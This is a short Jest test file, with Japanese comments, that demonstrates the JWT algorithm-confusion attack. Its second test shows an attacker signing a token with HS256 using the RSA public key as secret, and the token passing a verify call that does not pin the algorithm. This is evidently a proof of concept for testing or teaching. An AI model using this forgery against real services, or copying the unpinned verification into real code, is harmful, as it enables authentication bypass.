const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

// 公開鍵
const PUB = fs.readFileSync(path.join(__dirname, 'pub.pem'), 'utf8');
// 秘密鍵
const PRIV = fs.readFileSync(path.join(__dirname, 'priv.pem'), 'utf8');
// payload
const payload = {
  foo: "bar"
};

test('サーバー側で署名した TOKEN がチェックを通過し payload が取得できる', () => {
  // サーバー側で秘密鍵を利用し、アルゴリズムを RS256 で署名した TOKEN
  const RS256_TOKEN = jwt.sign(payload, PRIV, {algorithm: 'RS256'});

  expect(jwt.verify(RS256_TOKEN, PUB)).toEqual(payload);
});

test('攻撃者が署名した TOKEN がチェックを通過し payload が取得できる', () => {
  // 攻撃者がRS256の公開鍵を利用し、アルゴリズムを HS256 で署名したTOKEN
  // ※HS256はdefaultのアルゴリズムですがわかりやすいように設定
  const HS256_TOKEN = jwt.sign(payload, PUB, {algorithm: 'HS256'});

  expect(jwt.verify(HS256_TOKEN, PUB)).toEqual(payload);
});
